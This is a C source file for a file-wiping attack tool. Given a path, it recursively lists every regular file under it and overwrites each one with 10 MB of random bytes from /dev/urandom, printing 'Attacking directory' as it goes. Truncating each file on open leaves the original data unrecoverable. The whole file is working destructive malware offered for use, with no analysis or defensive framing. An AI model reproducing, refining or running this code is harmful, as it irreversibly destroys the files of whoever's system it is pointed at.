#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <sys/stat.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <time.h>

#define CHUNK_SIZE (10 * 1024 * 1024) // 10 MB

// Dynamic array to hold file paths
typedef struct {
    char **files;
    size_t count;
    size_t capacity;
} FileList;

void initFileList(FileList *list) {
    list->count = 0;
    list->capacity = 16;
    list->files = malloc(list->capacity * sizeof(char *));
    if (!list->files) {
        perror("malloc");
        exit(EXIT_FAILURE);
    }
}

void addFile(FileList *list, const char *filepath) {
    if (list->count == list->capacity) {
        list->capacity *= 2;
        char **tmp = realloc(list->files, list->capacity * sizeof(char *));
        if (!tmp) {
            perror("realloc");
            exit(EXIT_FAILURE);
        }
        list->files = tmp;
    }
    list->files[list->count] = strdup(filepath);
    if (!list->files[list->count]) {
        perror("strdup");
        exit(EXIT_FAILURE);
    }
    list->count++;
}

void freeFileList(FileList *list) {
    for (size_t i = 0; i < list->count; i++) {
        free(list->files[i]);
    }
    free(list->files);
}

// Recursively list files in directory
void fileLister(const char *dirloc, FileList *list) {
    DIR *dir = opendir(dirloc);
    if (!dir) {
        fprintf(stderr, "Failed to open directory '%s': %s\n", dirloc, strerror(errno));
        return;
    }

    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL) {
        // Skip "." and ".."
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;

        char path[4096];
        snprintf(path, sizeof(path), "%s/%s", dirloc, entry->d_name);

        struct stat st;
        if (stat(path, &st) == -1) {
            fprintf(stderr, "Failed to stat '%s': %s\n", path, strerror(errno));
            continue;
        }

        if (S_ISDIR(st.st_mode)) {
            fileLister(path, list);
        } else if (S_ISREG(st.st_mode)) {
            addFile(list, path);
        }
    }
    closedir(dir);
}

// Generate random bytes using /dev/urandom
int fillRandomBytes(unsigned char *buffer, size_t size) {
    FILE *urandom = fopen("/dev/urandom", "rb");
    if (!urandom) {
        perror("fopen /dev/urandom");
        return -1;
    }
    size_t read_bytes = fread(buffer, 1, size, urandom);
    fclose(urandom);
    return (read_bytes == size) ? 0 : -1;
}

void corrupter(const char *file, size_t size_MB) {
    size_t target_bytes = size_MB * 1024 * 1024;
    size_t bytes_written = 0;

    FILE *f = fopen(file, "wb");
    if (!f) {
        fprintf(stderr, "Failed to open file '%s' for writing: %s\n", file, strerror(errno));
        return;
    }

    unsigned char *buffer = malloc(CHUNK_SIZE);
    if (!buffer) {
        perror("malloc");
        fclose(f);
        return;
    }

    while (bytes_written < target_bytes) {
        size_t current_chunk = CHUNK_SIZE;
        if (target_bytes - bytes_written < CHUNK_SIZE)
            current_chunk = target_bytes - bytes_written;

        if (fillRandomBytes(buffer, current_chunk) != 0) {
            fprintf(stderr, "Failed to generate random data\n");
            break;
        }

        size_t written = fwrite(buffer, 1, current_chunk, f);
        if (written != current_chunk) {
            fprintf(stderr, "Failed to write to file '%s'\n", file);
            break;
        }

        bytes_written += current_chunk;
    }

    free(buffer);
    fclose(f);

    // Print with ANSI colors similar to Python code
    //printf("[\033[0;92m~\033[0m] File attacked: \033[0;92m%s\033[0m\n", file);
}

int is_directory(const char *path) {
    struct stat st;
    if (stat(path, &st) == -1)
        return 0;
    return S_ISDIR(st.st_mode);
}

int is_file(const char *path) {
    struct stat st;
    if (stat(path, &st) == -1)
        return 0;
    return S_ISREG(st.st_mode);
}

int main(int argc, char *argv[]) {
    char input_path[4096];

    if (argc > 1) {
        strncpy(input_path, argv[1], sizeof(input_path) - 1);
        input_path[sizeof(input_path) - 1] = '\0';
    } else {
        return 0;
		printf("Enter the directory location: ");
        if (!fgets(input_path, sizeof(input_path), stdin)) {
            fprintf(stderr, "Failed to read input\n");
            return EXIT_FAILURE;
        }
        // Remove trailing newline
        size_t len = strlen(input_path);
        if (len > 0 && input_path[len - 1] == '\n')
            input_path[len - 1] = '\0';
    }

    if (is_directory(input_path)) {
        printf("\nAttacking directory at \033[0;93m%s\033[0m\n", input_path);
        FileList files;
        initFileList(&files);
        fileLister(input_path, &files);
        for (size_t i = 0; i < files.count; i++) {
            corrupter(files.files[i], 10);
        }
        freeFileList(&files);
        printf("\n");
    } else if (is_file(input_path)) {
        corrupter(input_path, 10);
    } else {
        fprintf(stderr, "[ Error: directory location not found ]\n");
        return EXIT_FAILURE;
    }

    return EXIT_SUCCESS;
}
